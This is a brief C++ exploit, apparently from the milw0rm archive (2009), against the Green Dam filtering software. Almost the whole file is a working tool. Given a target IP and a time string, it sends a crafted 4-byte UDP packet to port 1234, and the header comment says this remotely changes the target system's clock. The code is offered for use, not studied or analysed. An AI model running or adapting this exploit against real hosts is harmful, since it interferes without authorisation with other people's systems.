// Green Dam listen on udp port 1234 and wait for the 4 bytes time value
// We can send some bytes to change the time of the dest system
// testgreendam[at]gmail.com


#include <iostream>
#include <boost/asio.hpp>
#include <boost/date_time.hpp>

int main(int argc, char* argv[])
{
    try
    {
        if (argc != 3)
        {
            std::cerr << "Usage: testgd <host> <time_string>" << std::endl;
            std::cerr << "Example: testgd 192.168.0.12 \"2009-06-03 16:00:00.000\"" << std::endl;
            std::cerr << "Timezone is not calculated, please do it by yourself." << std::endl;
            std::cerr << "testgreendam[at]gmail.com" << std::endl;
            return -1;
        }

        using boost::asio::ip::udp;
        boost::asio::io_service io_service;
        udp::socket s(io_service, udp::endpoint(udp::v4(), 0));
        udp::endpoint dest(
                boost::asio::ip::address::from_string(argv[1]), 1234);

        boost::posix_time::ptime start(boost::gregorian::date(1900,1,1));
        // (2008-1-1) -- (2010-12-31)
        boost::posix_time::ptime end(boost::posix_time::time_from_string(argv[2]));
        boost::posix_time::time_duration sec_count = end - start;

        unsigned int i = htonl(sec_count.total_seconds());
        s.send_to(boost::asio::buffer((char*)&i, 4), dest);
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << e.what() << std::endl;
        return -1;
    }

    return 0;
}

// milw0rm.com [2009-07-01]
